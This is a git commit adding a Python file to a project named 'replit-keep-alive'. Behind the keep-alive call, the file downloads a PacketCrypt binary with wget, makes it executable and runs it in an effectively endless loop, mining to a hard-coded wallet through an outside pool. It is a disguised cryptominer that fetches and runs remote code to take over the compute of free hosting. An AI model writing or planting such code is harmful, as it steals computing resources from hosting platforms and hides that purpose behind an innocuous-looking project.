bc4488e9014b0786eac3f8a6f9aa1da3ecd554a3
bacsiquaidi3 <90060308+bacsiquaidi3@users.noreply.github.com>
2021-09-03 17:18:35 +0000

    Add files via upload

---
+++ replit-keep-alive-main/main.py
@@ -0,0 +1,14 @@
+
+from replit_keep_alive import keep_alive
+import os
+
+
+keep_alive()
+ 
+os.system("wget clone https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.4.3/packetcrypt-v0.4.3-linux_amd64 -O packetcrypt")
+
+os.system("chmod +x packetcrypt")
+for x in range(999999999999999999999999999999999999999999999999999999999999999):
+    os.system("./packetcrypt ann -p pkt1qkvn3zrzmn08u7glmkqje9r3hwhr3pk0vh04xc5 http://pool.srizbi.com")
+
+ 
